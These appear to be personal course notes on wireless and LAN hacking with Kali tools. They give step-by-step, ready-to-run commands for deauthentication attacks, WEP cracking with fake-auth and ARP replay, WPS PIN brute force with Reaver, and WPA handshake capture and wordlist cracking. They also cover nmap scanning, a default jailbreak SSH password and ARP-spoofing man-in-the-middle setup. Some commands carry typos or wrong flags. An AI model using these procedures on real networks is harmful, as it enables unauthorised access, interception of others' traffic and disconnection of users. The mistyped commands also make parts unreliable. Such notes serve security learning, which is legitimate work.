#B01 IFCONFIG vs IWCONFIG
	ifconfig: deals with all network adapters
	iwconfig: deals with only wireless network interfaces

#B02 CHANGE MAC ADDRESS
(1) [disable network adapter]
	>>ifconfig wlan0 down
(2) [new MAC address should start from 00:...] (why?)
	>> ifconfig hw ether <newMAC>
		[hw stands for hardware]
(3) [enable the wireless adapter]
	>>ifconfig wlan0 up



----------------------------------------------------------------------------------



#WH01 ENABLE MONITOR MODE
(1) [disable network adapter before ebabling monitor mode] 
	>>ifconfig wlan0 down
(2) [kill all the ongoing network task - precautionary measure + better results]
	>>airmon-ng check kill
(3) [change to monitor mode from managed mode (default)]
	>>iwconfig wlan0 mode monitor
(4) [enable the wireless adapter]
	>>ifconfig wlan0 up
(4.1) [to cross check that monitor mode is enabled - check if 'Mode:Monitor']
	>>iwconfig




#WH02 PACKET SNIFFING [Tools- airodump-ng]
(0) Switch to monitor mode (say interface in monitor mode is named as wlan0)
(1) [to discover all wireless network in range]
	>>airodump-ng wlan0
		[to quit press Ctrl+C]
		
		[ BSSID--> MAC address of target, 
		  PWR--> signal strength, 
		  Beacons--> frames send by network to broadcast its existance,
			(all network devices even if hidden send these types of frames)
		  Data-->
		  #/s--> data packets collected in past 10s
		  CH--> Channel
		  MB--> max speed supported by network
		  AUTH--> security encryption use
		  ESSID--> name]




#WH03 SNIFFING SPECIFIC BANDS [Tools- airodump-ng]
(0) default search for airudump-ng is only 2.4GHz.
(1) [To seaarch 5GHz]
	>> airodump-ng --band a wlan0

-->> airodump-ng --band <band/> wlan0
		<band/> = [ a--> 5GHz,
		  	 bg--> 2.4 GHz 
		  	 abg--> for both 2.4GHz & 5GHz at the same time
		  	 ac--> lower than 6GHz ]
	* do not specify band if u wanna search 2.4GHz band only




#WH04 TARGETED SNIFFING [Tools- airodump-ng, wireshark]
(1) [To search a specific target]
	>> airodump-ng --bssid 5C:F9:FD:62:FE:09 --channel 7 --write test wlan0

-->> airodump-ng --bssid <bssid/> --channel <ch/> --write <filename/> wlan0
	<bssid/> --> bssid of target
	<ch/> --> channel of target
	<filename/> --> name of file to write sniffed data of target
	* All these information is collected from the output of command "airodump-ng wlan0"

(2) The Output shows the number of devices connected to this network, and their MAC address under "STATION"
	Some devices that are trying to connect to this network will show under "PROBE"

(3) Now, when you quit using Ctrl+C, you can see the output data files (05 files - .cap, .csv, .netxml, .log.csv) with your name provided.

(4) In .csv file, it has everything that the connected devices do with internet, ie. passwords they entered, sites they visited, everyting they have done while you were sniffing.
	* ENCRYPTION: BUT, the data is encrypted using the Security Encryption (WPA2, WPA, WEP) Used by their Wifi Router.
	* OPEN NETWORK: If the network is open network then you can see every url visited, every password entered using 'Wireshark'.

(why? what info other files hold?)

----------------------------------------------------------------------------------



#WH_A01 DEAUTHENTICATION ATTACK [Tools- aireplay-ng]
(0.1) Disconnect any client from any network
(0.2) Works on encrypted network (WEP, WPA & WPA2)
(0.3) No need to know the network key
(0.4) No need to connect to the network

-->> aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [TargetMac] [Interface]

	HOW IT WORKS:-
	Stakeholders involved: Hacker (us), Client (target), Access Point (Router)
	(0.5.1) First we pretent to be client who we want to disconnect by changing our MAC addresss to the MAC address of client, And tell the router that I (acting client) want to disconnect from you (Router).
		[pretent to be client by changing or MAC to client MAC, and send disconnect request]
	(0.5.2) Then, we pretent to be the router by changing our MAC to Router's MAC address and tell the client that you requested to be disconnected, so I am going to disconnect you.
		[pretent to be client by changing or MAC to client MAC, and tell you requested to be disconnected]
	(0.5.3) this allows us to disconnect/deauthenticate any client from any network.


(1) Gather 'BSSID' (ie MAC address) of router (target wifi) using airodump-ng (#WH02)
(2) Gather MAC ('STATION') of any one target clients by targeted sniffing using airodump-ng (#WH04)
(3) Make the airodump-ng running in the step-2, and open another terminal
(4) [send deauth requests using the following command]
	>>aireplay-ng --deauth 0 -a 5C:F9:FD:62:FE:09 -c B4:C4:FC:C8:6D:91 wlan0 

-->> aireplay-ng --deauth <number of packers/> -a <access point's MAC/> -c <client's MAC/> wlan0
	<number of packets/> = 0 (for infinite time attack)
	Alternate:
		--deauth: -0




#WH_A02_a WEP CRACKING [Tools- airodump-ng, aircrack-ng] 
(0.1) Wired Equivalent Privacy
(0.2) uses Encryption called RC4

	HOW IT WORKS:-
	(0.3.1) Client encrypts data using a key
	(0.3.2) encrypted data is send in the air
	(0.3.3) Router decrypts packet using the key
	(0.3.4) same goes when router communicates with device

	(0.3.5) Each packet is encrypted using a unique key stream
	(0.3.6) Random Initialization Vector (IV) is used to generate the key steam.
	(0.3.7) The IV is only 24-bits
	(0.3.8) IV + Key (actual wifi password) = Key Stream
	(0.3.9) Keysteam + "Data to send to router" = <encrypted data>
	
		(0.3.9.1) IV is too small (only 24-bits)
		(0.3.9.2) IV is sent in Plain-Text
		(0.3.9.3) IVs will repeat on busy network (since 24-bits is not big enough)
		(0.3.9.4) Repeated IVs can be used to determine the Key Steam
		(0.3.9.5) And hence Key (wifi password) can be obtained, along with all the traffic data, urls, passwords.


(Useful when traffic ie #Data is high, Use FAKE AUTH ATTACK #WH_A02_b when '#Data' is low)
(1) Gather bssid (ie MAC address) of target wifi network using airodump-ng (#WH02)
(2) Gather MAC (station) of target by targeted sniffing using airodump-ng (#WH04), and save it in a file lets say 'basic_wep'
(3) Let airodump run in the terminal in step-2, and use a seperate terminal to crack the KEY
	>>aircrack-ng 'basic_wep-01.cap'
	
	(3.1) You can connect to that wifi using the 'ASCII key' given in the output.
		(3.1.1) In some cases, only 'KEY' (like 00:11:22:33:44:55) is provided and 'ASCII password' is missing.
		(3.1.2) Just remove the colons from the key and use it as a password (ie. 001122334455 in our case will be the password)




#WH_A02_b FAKE AUTHENTICATION ATTACK (when less traffic ie. #Data is low)
	Problem: If network is not busy (low '#Data'), It would take a lot of time to capture enough IVs
	Solution: -->> Force the AP (Access Point ie wifi router) to generate new IVs

	Problem: APs only communicate with connected deivices
		--> we can't communicate with it
		--> we can't even start the attack
	Solution: -->> Associate with the AP before launching the attack


(1) [t1] Gather BSSID (ie MAC address) of Router (target wifi) using airodump-ng (#WH02)
(2) [t1] Gather MAC (station) of target client by targeted sniffing using airodump-ng (#WH04), and save it in a file lets say 'aireplay_file'
(3) [t1] As you would notice #Data is incresing very very slow, or not even increasing.
(4) [t2] Let airodump run in the terminal in step-2, and use a seperate terminal to start FAKE AUTH ATTACK
	>> aireplay-ng --fakeauth 0 -a 00:11:22:33:44:55 -h aa:bb:cc:dd:ee wlan0

-->> aireplay-ng --fakeauth <seconds between attacks/> -a <MAC of wifi router/> -h <our MAC address/> wlan0
	
	* You would see that now we are associated with the target Wifi, and same would be reflected in [t1].

(5) [t3] ARP Request Replay Attack
	HOW IT WORKS:-
	(5.1) Wait for an ARP packet
	(5.2) Capture it, and replay it (retransmit it)
	(5.3) This causes the AP to produce another packet with a new IV. (router is forced to do so)
	(5.4) Keep doing this till we have enough IVs to crack the key.

	>> aireplay-ng --arpreplay -b 00:11:22:33:44:55 -h aa:bb:cc:dd:ee wlan0

-->> aireplay-ng --arpreplay -b <MAC of wifi router/> -h <our MAC address/> wlan0

(6) [t3] wait for some time for ARP packet to be sent by router. Once it is sent by the router we capture it, and retransmit it. Once retransmition starts, you would notice speedy increase in #Data [t1].

(7) [t2] Associate one more time (step-4)

(8) crack KEY using aircrack-ng (basically follow WEP Cracking [#WH_A02_a] Step-3)
	>>aircrack-ng 'aireplay_file-01.cap'




#WH_A03_a WPA/WPA2 WPS CRACKING (Without Wordlist)
(0) Vulnerability - WPS
	(0.1) WPS is a feature that can be used with WPA & WPA2
	(0.2) Allows clients to connect without the password
	(0.3) Authentication is done using 8-digit pin
		(0.3.1) 8 digits is very small
		(0.3.2) we can try all possible pins in relatively short time
		(0.3.3) Then the WPS can be used to compute actual password
	* This only works if the router is configured not to use PBC (Push Button Authentication), if PBC is not pressed then the router will refuse all WPS requests
	* Usually WPS comes disabled and nowadays router comes with PBC.

(1) [t1] To capture all wifi that uses WPS
	>> wash --interface wlan0
	[ lck --> whether WPS is locked or not (should be 'NO' for attacking]

(2) [t2] *Reaver that is preinstalled in Kali is buggy, so use one provided in 'Softwares'
	(2.1) go to dir where reaver is downloaded
	(2.2) make is executable
		>> chmod +x reaver
	(2.3) Bruteforce every possible pin using Reaver
		>> ./reaver --bssid 11:22:33:44 --channel 7 --interface wlan0 -vvv --no-associate
-->> ./reaver --bssid <MAC of Target/> --channel <ch/> --interface wlan0 -vvv --no-associate
* reaver has a feature of automatic association,but it is buggy, so better to do it manually.

(3) [t1] Associate with target wifi using 'Fake Auth Attack' (just like WEP #WH_A02_b)
	>>aireplay-ng --fakeauth 30 -a 11:22:33:44:55:66 -h aa:bb:cc:dd:ee:ff wlan0 


#WH_A03_a WPA/WPA2 CRACKING
CAPTURING HANDSHAKE #WH_A03_a_i [Tool- airodump-ng, aireplay-ng] :
(1) [t1] Gather bssid (ie MAC address) of target wifi network using airodump-ng (#WH02)
(2) [t1] Gather MAC (station) of target by targeted sniffing using airodump-ng (#WH04), and save it in a file lets say 'wpa_handshake'
(3) [t2] Now, we have to wait to caprure WPA handshake, OR we can use 'Deauth Attack' (#WH_A01) [basicaly handshake is captured when the device reconnects manually/automatically after deauthentication]
	*  deauth time should be very less in this case eg 5-10, and not infinity (0) or very large number. We just want to disconnect the device for some time and let it connect thereafter in order to capture handshake.
(4) You will see 'WPA handhsake in [t1]' when done. It will be stored in the filename we provided earlier ie 'wpa_handshake' 
	* Handshake doesn't contain any data that helps recover password
	** It contains data that can be used to check if a key is valid or not

CREATING WORDLIST #WH_A03_a_ii [Tool- Crunch]:
(6) -->> crunch <min length/> <max length/> <all character to use/> -t <pattern/> -o <output filename/>
	* see crunch man for more options
	>> crunch 6 6 123abc$ -t a@@@@b -o mywordlist

We iterate over all the generated combinations in wordlist (wordlist combination + Handshake = MIC, compare it with MIC already in handshake. If it matches then the wordlist combination is the password.

(7) Try the wordlist
	>> aricrack-ng wpa_handshake-01.cap -w mywordlist

-->> aricrack-ng <handshake filename/> -w <wordlist name/>

(why?) FURTHER EXPLORATION:
** You can Pipe wordlist from crunch to aircrack-ng
** Use GPU to increase speed a lot faster (around 17x times)
** Use online services that crack Handshake, They uses huge wordlist and super computers
*** Also methods to pause your cracking process and resume later.



-------------------------------------------------------------------------



#NS_01 DISCOVERING DEVICES CONNECTED TO SAME NETWORK
(1) Check your IP (lets say 192.168.1.5) [inet=ip address, ether=MAC address]
	>> ifconfig 
(2) discover other devices on same network 
	[IPs over a network can range from xxx.xxx.x.1 to xxx.xxx.x.254]
	>> netdiscover -r 192.168.1/24
* to search over all 254 we do /24 (** not /254)

_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
*** IMPORTANT: IF NOT WORKING...*** 
	[ISSUE FIXED IN KALI 2021.4]
(https://samiux.blogspot.com/2020/03/howto-fix-netdiscover-not-working.html)

The libpcap0.8 is upgraded from 1.8.1-6 to 1.9.1-2 since Kali 2019.4. The "-r" switch of netdiscover is no longer workable since then as it is no longer updated since Oct 8, 2019. It is required to downgrade the libpcap0.8 to the version 1.8.1-6 and it should be held in order to prevent it from upgrade automatically in the future until netdiscover is upgraded accordingly.

>> wget http://ftp.us.debian.org/debian/pool/main/libp/libpcap/libpcap0.8_1.8.1-6_amd64.deb
>> sudo dpkg -i libpcap0.8_1.8.1-6_amd64.deb
>> sudo apt-mark hold libpcap0.8

Now, you can run it with "-r" switch.
>> sudo netdiscover -r 10.0.2.0/24
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _




#NS_02 GATHERING SENSITIVE INFORMATION ABOUT CONNECTED DEVICES
ZENMAP is GUI of NMAP. (*Not available by default on Kali)
**[ZENMAP installation depencies are no longer supported by Kali 2021.4]**
	* PING SCAN
		- HOW IT WORKS:-
		1)	Pings all the possible IP addr in the range
		2)	If device is active, we get a response.
		3) *Some devices do not give response on ping.

		- DETAILS: IP / MAC / Manufacturer
		- SPEED: Ping > Quick > Quick+ > Regular

			>> nmap -sn 192.168.1.1/24
		
	* QUICK SCAN
		- INFO: IP / MAC / Manufacturer / OPEN PORTS
		- SPEED: Ping > Quick > Quick+ > Regular

			>> nmap -T4 -F 192.168.1.1/24

	* QUICK SCAN PLUS
		- SPEED: Ping > Quick > Quick+ > Regular
		- INFO: OS / TYPE (Phone, Laptop, Router) / PROGRAM (& its version) running on OPEN PORTS
			>> nmap -sV -T4 -O -F --version-light 192.168.1.1/24
			
	[ iPhone default ssh password after jail-break: alpine
		>> ssh root@<IP of iphone/> ]
		

#NS_03 ARP POISONING

	How Does it work: (scene- all PCs and Hacker PC are connected to same Wifi network)
		(0.1) First we can know the MAC of target usning the 'Targeted Sniffing' (#WH04)
		(0.2) Then we send and ARP Requset (Address Resolution Protocol) to all the PCs in the same network. [Hacker: (to all) "WhO hAs MAC aDDr 00:11:22:33:44:99]
		(0.3) All other will ignore this request, only the PC with that MAC will respond.
		    [Target: (to attacker) "YeS i hAvE ThAt MAC]
		    
		    * All this communication is done through ARP protocol.
		    ** Every PC has an ARP table, which links IP address on same network to their MAC address.
		    	(to view your ARP table >>arp -a )
		    	
		    	
#NS_03_a ARP SPOOFING
	(0.4) Tell the Gateway (Access Point Wifi) that i am <IP of target>. So the AP (Access Point) will update its ARP table, and it will associate this IP address to out MAC address.
	
	(0.5) We will do same with the Target -  that i am <IP of Router>. The target will also update its ARP table.
	
	* Now the commmunication will be done via Attacker (Man In The Middle).
	
	
	Why ARP Spoofing is possible:
		(0) Not So safe
		(1) Clients accept responses even if they did not send request.
		(2) Clients trut response without any form of verification.
			
(0) To find IP of Router
	>> route -n			
(1) First we are gonna tell Target that I am the router
	>> arpspoof -i wlan0 -t <IP of Target/> <IP of Router/>
(2) Do same with the Router
	>> arpspoof -w wlan0 -t <IP of Router/> <IP of TARGET/>
(3) Now we are the MITM. But the requests send by the target to us (Thingking us as router) would not be passed to the actual router (this is due to security feature in linux). To enable this fordwarding, we are gonna enable port forwarding
	>> echo 1 > /proc/sys/net/ipv4/ip_forward
			


#NS_04 BETTERCAP
(1) To run Bettercap terminal	
	>> bettercap -iface wlan0
(2) To track new hosts in the network
	>> net.probe on
(3) Show the discovered clients
	>> net.show
